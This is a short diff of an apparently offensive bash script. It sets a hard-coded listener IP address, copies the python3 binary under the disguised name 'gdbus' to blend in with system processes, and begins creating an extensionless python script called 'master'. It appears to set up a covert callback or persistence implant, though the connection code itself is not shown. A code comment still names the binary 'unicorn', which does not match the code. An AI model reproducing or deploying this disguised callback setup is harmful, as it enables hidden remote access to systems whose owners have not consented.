@@ -6,12 +6,12 @@ read PORT
 echo "[+] Enter the directory should be stored:"
 read TARGET_DIR
 
-LISTENER_IP="172.105.118.102"
+LISTENER_IP="149.28.151.106"
 
 cd "$TARGET_DIR" || exit 1
 
 # 1. Copy python to name: unicorn
-cp /opt/gitlab/embedded/bin/python3 gdbus
+cp /usr/bin/python3 gdbus
 chmod +x gdbus                                                                                                                                                                                                                                               
 
 # 2. Create python script named: master (NO .py, NO shebang)
